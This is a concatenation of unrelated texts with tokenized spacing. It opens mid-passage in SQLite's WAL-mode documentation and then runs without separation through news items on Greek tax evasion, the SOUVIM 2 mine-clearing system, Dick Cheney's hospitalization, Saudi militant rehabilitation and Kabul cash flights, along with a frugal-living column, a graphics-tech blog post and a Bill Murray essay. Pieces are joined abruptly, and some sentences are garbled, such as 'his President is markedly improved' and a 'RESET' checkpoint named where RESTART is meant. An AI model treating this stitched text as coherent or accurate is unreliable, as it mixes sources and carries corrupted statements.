This has the effect of causing most COMMIT operations to be very fast but an occasional COMMIT ( those that trigger a checkpoint ) to be much slower .
If that effect is undesirable , then the application can disable automatic checkpointing and run the periodic checkpoints in a separate thread , or separate process .
( Links to commands and interfaces to accomplish this are shown below . )
Note that with PRAGMA synchronous set to NORMAL , the checkpoint is the only operation to issue an I/O barrier or sync operation ( fsync ( ) on unix or FlushFileBuffers ( ) on windows ) .
If an application therefore runs checkpoint in a separate thread or process , the main thread or process that is doing database queries and updates will never block on a sync operation .
This helps to prevent " latch - up " in applications running on a busy disk drive .
The downside to this configuration is that transactions are no longer durable and might rollback following a power failure or hard reset .
Notice too that there is a tradeoff between average read performance and average write performance .
To maximize the read performance , one wants to keep the WAL as small as possible and hence run checkpoints frequently , perhaps as often as every COMMIT .
To maximize write performance , one wants to amortize the cost of each checkpoint over as many writes as possible , meaning that one wants to run checkpoints infrequently and let the WAL grow as large as possible before each checkpoint .
The decision of how often to run checkpoints may therefore vary from one application to another depending on the relative read and write performance requirements of the application .
The default strategy is to run a checkpoint once the WAL reaches 1000 pages and this strategy seems to work well in test applications on workstations , but other strategies might work better on different platforms or for different workloads .
3. Activating And Configuring WAL Mode
An SQLite database connection defaults to journal_mode=DELETE .
To convert to WAL mode , use the following pragma :
PRAGMA journal_mode=WAL ;
The journal_mode pragma returns a string which is the new journal mode .
On success , the pragma will return the string " wal " .
If the conversion to WAL could not be completed ( for example , if the VFS does not support the necessary shared - memory primitives ) then the journaling mode will be unchanged and the string returned from the primitive will be the prior journaling mode ( for example " delete " ) .
3.1 . Automatic Checkpoint
By default , SQLite will automatically checkpoint whenever a COMMIT occurs that causes the WAL file to be 1000 pages or more in size , or when the last database connection on a database file closes .
The default configuration is intended to work well for most applications .
But programs that want more control can force a checkpoint using the wal_checkpoint pragma or by calling the sqlite3_wal_checkpoint ( ) C interface .
The automatic checkpoint threshold can be changed or automatic checkpointing can be completely disabled using the wal_autocheckpoint pragma or by calling the sqlite3_wal_autocheckpoint ( ) C interface .
A program can also use sqlite3_wal_hook ( ) to register a callback to be invoked whenever any transaction commits to the WAL .
This callback can then invoke sqlite3_wal_checkpoint ( ) or sqlite3_wal_checkpoint_v2 ( ) based on whatever criteria it thinks is appropriate .
( The automatic checkpoint mechanism is implemented as a simple wrapper around sqlite3_wal_hook ( ) . )
3.2 . Application - Initiated Checkpoints
An application can initiate a checkpoint using any writable database connection on the database simply by invoking sqlite3_wal_checkpoint ( ) or sqlite3_wal_checkpoint_v2 ( ) .
There are three subtypes of checkpoints that vary in their aggressiveness : PASSIVE , FULL , and RESTART .
The default checkpoint style is PASSIVE , which does as much work as it can without interfering with other database connections , and which might not run to completion if there are concurrent readers or writers .
All checkpoints initiated by sqlite3_wal_checkpoint ( ) and by the automatic checkpoint mechanism are PASSIVE .
FULL and RESTART checkpoints try harder to run the checkpoint to completion and can only be initiated by a call to sqlite3_wal_checkpoint_v2 ( ) .
See the sqlite3_wal_checkpoint_v2 ( ) documentation for additional information on FULL and RESET checkpoints .
3.3 . Persistence of WAL mode
Unlike the other journaling modes , PRAGMA journal_mode=WAL is persistent .
If a process sets WAL mode , then closes and reopens the database , the database will come back in WAL mode .
In contrast , if a process sets ( for example ) PRAGMA journal_mode=TRUNCATE
and then closes and reopens the database will come back up in the default rollback mode of DELETE rather than the previous TRUNCATE setting .
The persistence of WAL mode means that applications can be converted to using SQLite in WAL mode without making any changes to the application itself .
One has merely to run " PRAGMA journal_mode=WAL ; " on the database file (s ) using the command - line shell or other utility , then restart the application .
The WAL journal mode will be set on all connections to the same database file if it is set on any one connection .
4. The WAL File
While a database connection is open on a WAL - mode database , SQLite maintains an extra journal file called a " Write Ahead Log " or " WAL File " .
The name of this file on disk is usually the name of the database file with an extra " - wal " suffix , though different naming rules may apply if SQLite is compiled with SQLITE_ENABLE_8_3 _NAMES .
The WAL file exists for as long as any database connection has the database open .
Usually , the WAL file is deleted automatically when the last connection to the database closes .
However , if the last process to have the database open exits without cleanly shutting down the database connection , or if the SQLITE_FCNTL_PERSIST_WAL file control is used , then the WAL file might be retained on disk after all connections to the database have been closed .
The WAL file is part of the persistent state of the database and should be kept with the database if the database is copied or moved .
If a database file is separated from its WAL file , then transactions that were previously committed to the database might be lost , or the database file might become corrupted .
The only safe way to remove a WAL file is to open the database file using one of the sqlite3_open ( ) interfaces then immediately close the database using sqlite3_close ( ) .
The WAL file format is precisely defined and is cross-platform .
5. Read-Only Databases
Older versions of SQLite could not read a WAL - mode database that was read - only .
In other words , write access was required in order to read a WAL - mode database .
This constraint was relaxed beginning with SQLite version 3.22.0 ( 2018-01 - 22 ) .
On newer versions of SQLite , a WAL - mode database on read - only media , or a WAL - mode database that lacks write permission , can still be read as long as one or more of the following conditions are met :
The - shm and - wal files already exists and are readable
There is write permission on the directory containing the database so that the - shm and - wal files can be created .
The database connection is opened using the immutable query parameter .
Even though it is possible to open a read - only WAL - mode database , it is good practice to converted to PRAGMA journal_mode=DELETE prior to burning an SQLite database image onto read - only media .
6. Avoiding Excessively Large WAL Files
In normal cases , new content is appended to the WAL file until the WAL file accumulates about 1000 pages ( and is thus about 4 MB in size ) at which point a checkpoint is automatically run and the WAL file is recycled .
The checkpoint does not normally truncate the WAL file ( unless the journal_size_limit pragma is set ) .
Instead , it merely causes SQLite to start overwriting the WAL file from the beginning .
This is done because it is normally faster to overwrite an existing file than to append .
When the last connection to a database closes , that connection does one last checkpoint and then deletes the WAL and its associated shared - memory file , to clean up the disk .
So in the vast majority of cases , applications need not worry about the WAL file at all .
SQLite will automatically take care of it .
But it is possible to get SQLite into a state where the WAL file will grow without bound , causing excess disk space usage and slow queries speeds .
The following bullets enumerate some of the ways that this can happen and how to avoid them .
Disabling the automatic checkpoint mechanism .
In its default configuration , SQLite will checkpoint the WAL file at the conclusion of any transaction when the WAL file is more than 1000 pages long .
However , compile - time and run-time options exist that can disable or defer this automatic checkpoint .
If an application disables the automatic checkpoint , then there is nothing to prevent the WAL file from growing excessively .
Checkpoint starvation .
A checkpoint is only able to run to completion , and reset the WAL file , if there are no other database connections using the WAL file .
If another connection has a read transaction open , then the checkpoint cannot reset the WAL file because doing so might delete content out from under the reader .
The checkpoint will do as much work as it can without upsetting the reader , but it can not run to completion .
The checkpoint will start up again where it left off after the next write transaction .
This repeats until some checkpoint is able to complete .
However , if a database has many concurrent overlapping readers and there is always at least one active reader , then no checkpoints will be able to complete and hence the WAL file will grow without bound .
This scenario can be avoided by ensuring that there are " reader gaps " : times when no processes are reading from the database and that checkpoints are attempted during those times .
In applications with many concurrent readers , one might also consider running manual checkpoints with the SQLITE_CHECKPOINT_RESTART or SQLITE_CHECKPOINT_TRUNCATE
option which will ensure that the checkpoint runs to completion before returning .
The disadvantage of using SQLITE_CHECKPOINT_RESTART and SQLITE_CHECKPOINT_TRUNCATE
is that readers might block while the checkpoint is running .
Very large write transactions .
A checkpoint can only complete when no other transactions are running , which means the WAL file cannot be reset in the middle of a write transaction .
So a large change to a large database might result in a large WAL file .
The WAL file will be checkpointed once the write transaction completes ( assuming there are no other readers blocking it ) but in the meantime , the file can grow very big .
As of SQLite version 3.11.0 ( 2016-02 - 15 ) , the WAL file for a single transaction should be proportional in size to the transaction itself .
Pages that are changed by the transaction should only be written into the WAL file once .
However , with older versions of SQLite , the same page might be written into the WAL file multiple times if the transaction grows larger than the page cache .
7. Implementation Of Shared - Memory For The WAL - Index
The wal - index is implemented using an ordinary file that is mmapped for robustness .
Early ( pre-release ) implementations of WAL mode stored the wal - index in volatile shared - memory , such as files created in / dev/shm on Linux or / tmp on other unix systems .
The problem with that approach is that processes with a different root directory ( changed via chroot ) will see different files and hence use different shared memory areas , leading to database corruption .
Other methods for creating nameless shared memory blocks are not portable across the various flavors of unix .
And we could not find any method to create nameless shared memory blocks on windows .
The only way we have found to guarantee that all processes accessing the same database file use the same shared memory is to create the shared memory by mmapping a file in the same directory as the database itself .
Using an ordinary disk file to provide shared memory has the disadvantage that it might actually do unnecessary disk I/O by writing the shared memory to disk .
However , the developers do not think this is a major concern since the wal - index rarely exceeds 32 KiB in size and is never synced .
Furthermore , the wal - index backing file is deleted when the last database connection disconnects , which often prevents any real disk I /O from ever happening .
Specialized applications for which the default implementation of shared memory is unacceptable can devise alternative methods via a custom VFS .
For example , if it is known that a particular database will only be accessed by threads within a single process , the wal - index can be implemented using heap memory instead of true shared memory .
8. Use of WAL Without Shared - Memory
Beginning in SQLite version 3.7.4 ( 2010 - 12-07 ) , WAL databases can be created , read , and written even if shared memory is unavailable as long as the locking_mode is set to EXCLUSIVE before the first attempted access .
In other words , a process can interact with a WAL database without using shared memory if that process is guaranteed to be the only process accessing the database .
This feature allows WAL databases to be created , read , and written by legacy VFSes that lack the " version 2 " shared - memory methods xShmMap , xShmLock , xShmBarrier , and xShmUnmap on the sqlite3_io_methods object .
If EXCLUSIVE locking mode is set prior to the first WAL - mode database access , then SQLite never attempts to call any of the shared - memory methods and hence no shared - memory wal - index is ever created .
In that case , the database connection remains in EXCLUSIVE mode as long as the journal mode is WAL ; attempts to change the locking mode using " PRAGMA locking_mode=NORMAL ; " are no-ops .
The only way to change out of EXCLUSIVE locking mode is to first change out of WAL journal mode .
If NORMAL locking mode is in effect for the first WAL - mode database access , then the shared - memory wal - index is created .
This means that the underlying VFS must support the " version 2 " shared - memory .
If the VFS does not support shared - memory methods , then the attempt to open a database that is already in WAL mode , or the attempt convert a database into WAL mode , will fail .
As long as exactly one connection is using a shared - memory wal - index , the locking mode can be changed freely between NORMAL and EXCLUSIVE .
It is only when the shared - memory wal - index is omitted , when the locking mode is EXCLUSIVE prior to the first WAL - mode database access , that the locking mode is stuck in EXCLUSIVE .
9. Sometimes Queries Return SQLITE_BUSY
In WAL Mode
The second advantage of WAL - mode is that writers do not block readers and readers to do not block writers .
This is mostly true .
But there are some obscure cases where a query against a WAL - mode database can return SQLITE_BUSY , so applications should be prepared for that happenstance .
Cases where a query against a WAL - mode database can return SQLITE_BUSY include the following :
If another database connection has the database mode open in exclusive locking mode then all queries against the database will return SQLITE_BUSY .
Both Chrome and Firefox open their database files in exclusive locking mode , so attempts to read Chrome or Firefox databases while the applications are running will run into this problem , for example .
When the last connection to a particular database is closing , that connection will acquire an exclusive lock for a short time while it cleans up the WAL and shared - memory files .
If a second database tries to open and query the database while the first connection is still in the middle of its cleanup process , the second connection might get an SQLITE_BUSY error .
If the last connection to a database crashed , then the first new connection to open the database will start a recovery process .
An exclusive lock is held during recovery .
So if a third database connection tries to jump in and query while the second connection is running recovery , the third connection will get an SQLITE_BUSY error .
10 . Backwards Compatibility
The database file format is unchanged for WAL mode .
However , the WAL file and the wal - index are new concepts and so older versions of SQLite will not know how to recover a crashed SQLite database that was operating in WAL mode when the crash occurred .
To prevent older versions of SQLite ( prior to version 3.7.0 , 2010 - 07 - 22 ) from trying to recover a WAL - mode database ( and making matters worse ) the database file format version numbers ( bytes 18 and 19 in the database header ) are increased from 1 to 2 in WAL mode .
Thus , if an older version of SQLite attempts to connect to an SQLite database that is operating in WAL mode , it will report an error along the lines of " file is encrypted or is not a database " .
One can explicitly change out of WAL mode using a pragma such as this :
PRAGMA journal_mode=DELETE ;
Deliberately changing out of WAL mode changes the database file format version numbers back to 1 so that older versions of SQLite can once again access the database file .
To get more attentive care in the country ’s national health system , Greeks routinely pay doctors cash on the side , a practice known as “ fakelaki , ” Greek for little envelope .
And bribing government officials to grease the wheels of bureaucracy is so standard that people know the rates .
They say , for instance , that 300 euros , about $ 400 , will get you an emission inspection sticker .
Some of the most aggressive tax evaders , experts say , are the self - employed , a huge pool of people in this country of small businesses .

The cheating is often quite bold .
When tax authorities recently surveyed the returns of 150 doctors with offices in the trendy Athens neighborhood of Kolonaki , where Prada and Chanel stores can be found , more than half had claimed an income of less than $ 40,000 .
Thirty - four of them claimed less than $ 13,300 , a figure that exempted them from paying any taxes at all .
Such incomes defy belief , said Ilias Plaskovitis , the general secretary of the Finance Ministry , who has been in charge of revamping the country ’s tax laws .
“ You need more than that to pay your rent in that neighborhood , ” he said .
He said there were only a few thousand citizens in this country of 11 million who last year declared an income of more than $ 132,000 .
Yet signs of wealth abound .
“ There are many people with a house , with a cottage in the country , with two cars and maybe a small boat who claim they are earning 12,000 euros a year , ” Mr. Plaskovitis said , which is about $ 15,900 .
“ You can not heat this house or buy the gas for the car with that kind of income . ”

The Greek government has set a goal for itself of collecting at least $ 1.6 billion more than last year — a modest goal , Mr. Plaskovitis believes .
But European Union officials were so skeptical , Mr. Plaskovitis said , they would not even allow the figure to be included in the budget forecast used in negotiations over the bailout package .

Dear New Frugal
You ,
I ’ve already trimmed back my spending the obvious ways — no more Starbucks , no movies , the cable - TV pay channels have all been turned off .
Now I ’m having no fun and am still falling behind .
How do I cut back further ?
— Getting Desperate
Dear Desperate ,
Your heart is in the right place .
But we ’d have to say that you have been majoring in the minors .
While it ’s a good idea to avoid expensive lattes and cut the cable , the impact will probably be minimal ( unless you have a serious addictions to caffeine and “ Pawn Stars ” ) .
1. Housing .
2. Transportation .
3. Food .
According to the U.S. Statistical Abstract ( table 668 ) , the average American family spends 63 percent of all their money in three categories :
If we want to seriously cut our expenses , we ’ll need to hunt where the big expenses are .
Housing
Let ’s start our hunt with housing , which the U.S. Statistical Abstract says accounts for 34 percent of our expenses .
If you have n’t already refinanced ( and you ’re not upside down ) , now is the time to do it .
Mortgage rates are at 50 - year lows .
A refinance could save you hundreds each month .
Check your homeowners ’ insurance .
Make your insurance company prove that they ’re the best every year or two .
Get comparison insurance quotes .
A little effort could produce a couple of hundred bucks in savings .
Then check your utilities .
Most electric companies will do a free energy audit .
Their gurus will tell you how much your bill can be reduced each month and how to get those savings .
The good thing about saving on your home is that they ’re typically big , one - time deals .
You refinance today and reap the savings as long as you have your mortgage .
Transportation
Next in our big expense hunt is transportation ( 17 percent of our expenses ) .
Again , check your insurance .
It ’s easy to compare quotes online .
And perform any routine maintenance ( think air filters and checking your tires — both DIY jobs ) .
The bad news with auto savings is that you ’re pretty limited .
At this point , you ’re pretty much done unless you can carpool or sell your ride .
Food
A great place to reduce our spending is in feeding ourselves ( 12 percent ) .
The reason is simple :
You buy food every day , and you can make small changes that wo n’t seriously affect your lifestyle or health .
And the bonus is that you ’ll be affecting a fairly large portion of your budget .
For busy families , the first step to reducing food costs is to prepare more food at home .
For every $ 1 we spend on food , 43 cents of it is either prepared or eaten out .
So eating at home could save big bucks .
“ But I ’m too busy , ” you say .
“ How can I avoid the drive - through ? ” Easy : by creatively using your freezer .
These two freezer strategies can turn you into a first - class kitchen wizard !
The first is cooking for the freezer .
It ’s really quite simple .
Many meals that you make freeze well .
Instead of making one meatloaf when you get home tonight , make three .
Trust me , it ’s almost no extra effort .
When two of them are about 75 percent cooked , pull them from the oven and package them for the freezer .
Naturally , you ’ll mark what they are and when you made them .
They will also be listed on an inventory sheet you ’ll add to the fridge door alongside Missy ’s first - grade drawings .
The next time that you ’re tempted to pick up fast - food gut bombs , save the 20 bucks and take a meatloaf from your freezer .
Your microwave will allow you to have it on your table in a few minutes with a minimum of effort .
Add a potato , veggie and salad and you have a much healthier meal for a fraction of the cost .
Plus you wo n’t be cursing the clown who ’s holding up the drive - through line at McBurger Queen .
The second trick is even easier .
At the end of the meal , you ’re going to package the leftovers into individual meals .
Take a paper plate and put a portion of meat , potato and veggie onto the plate .
Put it into a freezer bag and mark what it is and when you froze it .
You ’ve just created a frozen dinner !
Make as many plates as you have leftovers .
Pop them into the freezer and add to your fridge door inventory sheet .
Now , when you pick up Sonny from soccer practice , just drive home instead of getting in line at your local Kentucky Fried Okra Jr .
When you get home , check the inventory and ask Sonny if he ’d prefer the meatloaf from Monday or the fried chicken from last week .
He gets to order what he wants .
He ’ll be happy .
You save money .
And , by the way , these also make great lunches if you have a microwave at work .
These two tools will greatly reduce your need for restaurants .
You ’ll find that you can eat steak at home for the price of hamburgers out , and you wo n’t hear “ Ewww , leftovers ” anymore .
Finally , as an added bonus , because you ’ll be constantly using your fridge , you wo n’t find moldy green stuff formerly known as food hiding in there .
That alone should be reason to try them !

Jim pointed me at this video earlier , presumably believing that my knowledge of , for instance , how to overclock a processor without setting my house on fire means I can say whether there ’s any water to its boasts .
Um. Maybe ?
Unlimited Detail Technology reckon their clever tech is the biggest leap in realtime 3D graphics in decades .
If what they say is true , we ’re going to wave goodbye to games rendered in polygons , and hello to games free from cubist edges and limited model counts .
Take a look below , and see what you think .
It ’s eight minutes long , but they ’re worthwhile minutes .
Apart from the one powerpoint slide about why polygons are bad that it shows about 15 times , anyway .
( Before the ‘ but that looks rubbish ’ comments arrive – the reason Unlimited Detail give for the stuff they ’re showing looking a little rustic is that the artwork is created by programmers , not artists . )
Let ’s leave aside the fact that the voiceover alternates between chirpy educational TV and a strange creeping menace , and instead concentrate on what it ’s promising .
To whit , games that can show as much or as little as the creators wish , with no apparent concern as to the hardware they ’re running on .
It ’s done by using points instead of polygons , it runs purely in software , and it can even do its thing on a mobile phone .
It sounds amazing .
It sounds crazy .
Maybe it is – grud only knows we ’ve seen plenty of wondrous - sounding technology promises fail to arrive over the years , but let ’s hope this one can pull it off .
The rough concept behind it is that the game is only ever rendering the pixels you can see at any one time , rather than trying to muster the whole shebang on a constant basis .
Or , to use their words :
“ Unlimited Detail is basically a point cloud search algorithm .
We can build enormous worlds with huge numbers of points , then compress them down to be very small .
The Unlimited Detail engine works out which direction the camera is facing and then searches the data to find only the points it needs to put on the screen it does n’t touch any unneeded points , all it wants is 1024 * 768 ( if that is our resolution ) points , one for each pixel of the screen .
It has a few tricky things to work out , like : what objects are closest to the camera , what objects cover each other , how big should an object be as it gets further back .
But all of this is done by a new sort of method that we call MASS CONNECTED PROCESSING .
Mass connected processing is where we have a way of processing masses of data at the same time and then applying the small changes to each part at the end . ”
There ’s another video on the site – I can’t find an embeddable version yet , but it ’s got much more footage of the tech itself in action .
It ’s the Comparison one at the bottom of the page that you ’re after .
Oh , be warned Voiceover Guy gets even stranger in it , possibly due to the insane bell - based soundtrack .
With the released footage only demonstrating static environments rather than an interactive landscape , and anything playable apparently being some 16 months off , it ’d be reckless to start shouting “ THE FUTURE ! THIS IS THE FUTURE ! ” just yet .
The theory seems sound , but the practice can only be complicated .
Creating content , for one thing – it ’s expensive enough for developers to create a current - gen AAA game , so how do they muster the resources to fill a photo - real world with , ah , unlimited detail ?
It ’d be lovely to see it , of course , but it may take some doing .
Secondly , the tech ’s strength seems to be in geometry – real - time animation , lighting and shadowing seems a little skipped over thus far , and may be an area in which UDT lags behind the otherwise more old - fashioned polygon - based rendering system .
Again , though , the stuff on show is terribly early and was n’t created by pro artists .
Moreover , even if it ca n’t ultimately compete with high - end traditionally - rendered games , it could well be a fantastic way to make low - end machines create far more complicated scenes than they ’d otherwise be capable of .
Keeping an eye on this one .
The potential is incredible , whether or not the industry picks it up .
A state senator who opposes gay marriage is asking questions about plans to change a camping rule in the state park system .
Just over a year ago the Iowa Supreme Court issued a ruling which legalized gay marriage in Iowa .
Senator Merlin Bartz , a Republican from Grafton , says it appears to him that the Department of Natural Resources wants to make gay couples eligible for family camping at state parks .
“ They ’re citing the Supreme Court case and changing , you know , ‘ husband and wife ’ language to ‘ spouse , ' ” Bartz says .
The rates or fees for camp sites are the same , whether you ’re a family or a non-family , but the state allows families to put up more than one tent on a camp site .
“ They ’re changing their language even though the state legislature has not had a debate on this particular issue , ” Bartz says .
Bartz is a member of the Legislature ’s Administrative Rules Review Committee which meets on Monday .
He ’s asked D.N.R. officials to explain their proposal at that meeting .
Bartz says he wants to be “ vigilant ” and keep state agencies from writing rules that extend new benefits to gay couples .
“ A lot of the advocates of gay marriage in Iowa have said , ‘ It does n’t affect anything .
Nothing has changed , ' ” Bartz says .
“ The reality of it is that everything is changing . ”
Bartz concedes the D.N.R. might be sued if they fail to ensure “ family ” policies for camping apply to gay couples , although Bartz says the state may be sued by gay marriage opponents if the rule is changed .
The proposed rule will be formally presented to Bartz and the rest of the legislative panel on May10th , but the final draft wo n’t be up for a committee vote until later this summer .
At that point the Administrative Rules Review Committee has several options to delay implementation , including a move which would delay a decision on family camping policies until 2011 so the full legislature could make the decision .

Pope Benedict XVI criticised gay marriage and abortion as " insidious and dangerous threats to the common good " in a speech at Fatima as Portugal prepares to legalise same - sex unions .
The pontiff received a standing ovation from an audience of church and lay social workers when he described abortion as a " tragedy " and said the family was based " on the indissoluble marriage between a man and a woman " .
Portugal , long viewed as deeply conservative , is set to legalise gay marriage next week only three years after decriminalising abortion .
The Pope expressed his " deep appreciation " for social and pastoral care workers who " defend life and promote the reconciliation and healing of those harmed by the tragedy of abortion " .
" Initiatives aimed at protecting the essential and primary values of life , beginning at conception , and of the family based on the indissoluble marriage between a man and a woman , help to respond to some of today 's most insidious and dangerous threats to the common good , " he said .

First Deliveries Of Counter - Mining System SOUVIM 2
The system relies on the combined action of two vehicles towing mine - activation trailers .
The first vehicle is designed to roll over a pressure mine without activating it .
by Staff Writers
Paris , France ( SPX ) Jun 28 , 2010
Development of SOUVIM 2 , a mine path clearing system designed and manufactured by MBDA since 2008 , has just been completed .
Two units of this land vehicle set will be delivered very shortly to the DGA , the French armament procurement agency and will undergo final qualification testing before delivery to the French Army .
In line with the DGA 's aim , the French Army will be ready to deploy this system on foreign theatres in 2010 .
SOUVIM 2 was designed for use in mobility support missions , allowing quick clearing of mined paths over long distances behind the lines : over 100 km of track cleared daily , with extensive counter - mining capabilities .
The SOUVIM 2's performance is currently unequalled .
The system relies on the combined action of two vehicles towing mine - activation trailers .
The first vehicle is designed to roll over a pressure mine without activating it .
It tows a first " mine - triggering trailer " ( RDM ) whose weight will trigger pressure - sensitive mines and thereby secure the second vehicle 's progress .
This latter vehicle tows two further RDMs whose different wheel bases help cover the whole width of the track to be cleared .
Everybody Loves Bill Murray
By Michael Murray | Think Pieces | May 18 , 2010 |
Everybody loves Bill Murray .
I was thinking about this last week after Dustin posted a video of him reading poetry to construction workers .
There was n’t anything particularly striking about the video , but still , it was irresistible .
In the video , Murray read three or four poems to about 20 guys on a construction site .
Standing there with their arms crossed , the assembled workers looked bored , embarrassed , and confused .
Exchanging uncomfortable looks with one another , like a bunch of sixth graders fearing that something “ gay ” was happening to them on the schoolyard , they nervously looked for social cues from their peers .
It was funny , but in an awkward way , and it looked like the video was being set - up to mock both the workers and the pretenses of poetry .
But that did n’t happen .
Just at the point when stretching the readings out would have been exploitive of the workers ’ sincere discomfort — the sort of torture that Tom Green would have engaged in — Murray released all the tension , and in a jubilant and accessible way , swept the workers into the center of the performance .
What started off as alienating ended up being inclusive , and it was sweet , funny and entirely winning .
This , of course , is the unique and brilliant talent of Bill Murray .
He ’s absurdly charming , a man who ’s able to shift gears and connect , on a meaningful level , with whomever happens to be around him .
Born in Chicago in 1950 , Murray grew up in a prosaic suburb under difficult circumstances .
As a young man , while studying pre-med in Denver , he was busted for possession of marijuana at Chicago ’s O’Hare airport , and subsequently abandoned his studies .
In short order he was performing with Second City in Chicago , before becoming a cast regular on “ Saturday Night Live . ”
With a weary , slightly pockmarked face , you get the sense that his path was n’t easy , and that he earned everything that he ’s received through the persuasiveness of his extraordinary talent .
There ’s an authenticity to him that seems to defy Hollywood , and his lack of affectation extends to the point where he does n’t even have a manager or an agent , and he ’s unfailingly polite and adores golf , a sport so , well , average , it almost seems like he ’s just a real guy !
And if of this effortless cool is n’t enough for you , well , you should know that he quit Hollywood for four years after his pet project — the film adaptation of the literary novel The Razor ’s Edge — flopped , and moved to Paris where he studied philosophy and history at the Sorbonne .
But still , when I think of the first half of Murray ’s career I do n’t think of a generous performer .
I think of somebody , who although wickedly funny , was also smug .
It was like he was living within an inside the joke the rest of us never had access to , and there was always something ironic , even sarcastic in his tone .
Even though we were always won over , we also had the uncomfortable sense that he might just be making fun of us , too .
There was the potential for meanness there , and it was easy to imagine that deep down he might just have contempt for his Botoxed peers in Hollywood , and for the audience that chose to celebrate Meatballs and not The Razor ’s Edge .
I think this side of Bill Murray began to soften as he entered into his 40s , and the movie that marks this transition is the 1993 film Groundhog Day .
It ’s a terrific movie , and although Murray ’s performance is n’t a startling departure from his previous work , the arc of maturation the central character goes through seems to foreshadow that of the actor ’s career .
Murray ’s character , a self - centered and arrogant weatherman from the big city , must live the same day over and over again in a small town full of unsophisticated rubes .
Naturally , he considers this to be a hellish punishment and assuming the all - knowing status of the divine , seeks to manipulate everybody for his own immediate gratification .
Eventually he figures out that it ’s much more rewarding to use his circumstance to get to know people and help them , instead of exploiting them to serve his own narrow interests .
You know , if you ’re intelligent , the trick is to make people around you feel smarter , not less so .
In short , he acquired wisdom , becoming sympathetic and compassionate to the world around him rather than contemptuous .
Five years later Bill Murray gave a performance in Wes Anderson ’s film Rushmore that established him as an actor with some complexity and heft .
Sadder and wiser , this incarnation of Murray projected a benevolent and whimsical melancholy .
He was still funny as hell , but now he was more than just a cut - up thumbing his nose at authority .
Earlier , the fact that Murray seemed capable of seeing deeper and further than the rest of us made him seem superior , even bored , but now it infused him a kind of humility , as he now knew that our lives ultimately elude our own control , regardless of their talent or will .
Murray found a perfect home in the films of Sofia Coppola , Jim Jarmusch , and Wes Anderson .
These movies , unlike a lot of mainstream releases , relied on mood more than plot for their meaning to be conveyed , and in Murray they found an actor who could convey a thousand complex emotions in a single look .
In The Darjeeling Limited , perhaps Anderson ’s weakest film , Murray ( now an Anderson regular ) made two very brief appearances .
At the very start of the movie we see him dressed with the old fashioned panache of an accidental hipster running with his luggage in an attempt to catch a train .
The much younger Adrien Brody — a gangle of long - legged ambition — speeds by him as Murray , now out of breath , gives up and fades into the distance , the train pulling away .
Later , about two - thirds of the way through the movie , we see Murray again , and this time for no more than two seconds .
Anderson takes a moment to allow his camera to pass lyrically through the walls of the moving train , settling briefly on passengers in unguarded moments , and for a moment we see Murray , staring out a window , a glass of sweet tea at his hand .
Turning around , he looks into the camera for just a second , but in this we feel more emotional depth than anywhere else in the film .
Bill Murray is now more than just a comedian or actor , but an artist .
We see somebody who has come to a point where they ’re at peace with having a little bit of sadness in life , and now he seems happy to include us in that inside joke he seemed to be living in earlier in his career , knowing that ultimately and inescapably , it ’s on each one of us .
WASHINGTON -- Former Vice President Dick Cheney was admitted to the hospital Friday after experiencing discomfort , the latest health scare for the 69 - year - old Republican leader who has a long history of heart disease .
FoxNews.com has learned that the former vice president is expected to be discharged from George Washington University in the next day or two .
According to a statement from the Office of the Former Vice President , Cheney 's illness was a result of progressive retention of fluid related to his coronary artery disease .
After receiving IV medication , his President is " markedly improved " .
Cheney was not feeling well on Friday and went to see his doctors , and , on their advice , he was admitted to the hospital for further testing .
Cheney 's heart attack earlier this year was his fifth since age 37 .
A heart attack occurs when blood flow to the heart muscle is blocked .
In that episode in February , Cheney underwent a stress test and a heart catheterization .
Long said he had no other details about Cheney 's condition .
A face of his party for decades , Cheney has remained a prominent voice of opposition to the Obama administration .
His public career spanned decades , including service as a lawmaker , defense secretary and White House chief of staff .
Cheney had bypass surgery in 1988 , as well as two later angioplasties to clear narrowed coronary arteries .
In 2001 , he had a special pacemaker implanted in his chest .
In addition , doctors in 2008 restored a normal rhythm to his heart with an electric shock .
It was the second time in less than a year that Cheney had experienced and been treated for an atrial fibrillation , an abnormal rhythm involving the upper chambers of the heart .

RIYADH ( Reuters ) - Around 25 former detainees from Guantanamo Bay camp returned to militancy after going through a rehabilitation program for al Qaeda members in Saudi Arabia , a Saudi security official said on Saturday .
The United States have sent back around 120 Saudis from the detention camp at the U.S. naval base in Cuba , set up after the U.S. launched a “ war on terror ” following the September 11 attacks by mostly Saudi suicide hijackers sent by al Qaeda .
Saudi Arabia , the world ’s top oil exporter , has put the returned prisoners along with other al Qaeda suspects through a rehabilitation program which includes religious re-education by clerics and financial help to start a new life .
The scheme , which some 300 extremists have attended , is part of anti-terrorism efforts after al Qaeda staged attacks inside the kingdom from 2003 - 06 .
These were halted after scores of suspects were arrested with the help of foreign experts .
Around 11 Saudis from Guantanamo have gone to Yemen , an operating base for al Qaeda , while others have been jailed again or killed after attending the program , said Abdulrahman al - Hadlaq , Director General of the General Administration for Intellectual Security overseeing the rehabilitation .
He pinpointed strong personal ties among former prisoners but also tough U.S. tactics as the reason why some 20 percent of the returned Saudis relapsed into militancy compared to 9.5 percent of other participants in the rehabilitation program .
“ Those guys from other groups did n’t suffer torture before , the non-Guantanamos ( participants ) .
Torturing is the most dangerous thing in radicalization .
You have more extremist people if you have more torture , ” Hadlaq told reporters in a rare briefing about Saudi anti-terrorism efforts .
REHABILITATION SCHEME
“ A SUCCESS ”
Despite the setback with Guantanamo prisoners , Saudi Arabia regards the rehabilitation scheme , which kicks in after militants have served a prison term , as a success .
“ There is no doubt that there is an effect , ” Hadlaq said .
U.S. President Barack Obama ordered the camp shut after taking office in January 2009 but his plans have been stymied .
There are now about 180 detainees left , among them 13 Saudis .
At its peak , the camp held about 780 detainees .
More than 2,000 sympathizers of al Qaeda are still in prison in Saudi Arabia .
Some 2,000 teachers have been removed from classrooms for their extremist views in the past five years while 400 teachers are in prison , Hadlaq said .
Saudi Arabia plans to build five more rehabilitation centers which will be able to accommodate 250 people each , he said .
The expansion plans are partly to cope with the eventual release of 991 suspected al Qaeda militants whom the authorities said in October were awaiting trial for 30 attacks since 2003 .
In July , a Saudi court sentenced one unnamed Islamist to death and handed out to others jail terms of up to 30 years in the first publicly reported trials since the arrests .
KABUL — More than $ 3 billion in cash has been openly flown out of Kabul International Airport in the past three years , a sum so large that U.S. investigators believe top Afghan officials and their associates are sending billions of diverted U.S. aid and logistics dollars and drug money to financial safe havens abroad .
The cash — packed into suitcases , piled onto pallets and loaded into airplanes — is declared and legal to move .
But U.S. and Afghan officials say they are targeting the flows in major anticorruption and drug trafficking investigations because of their size relative to Afghanistan 's small economy and the murkiness of their origins .
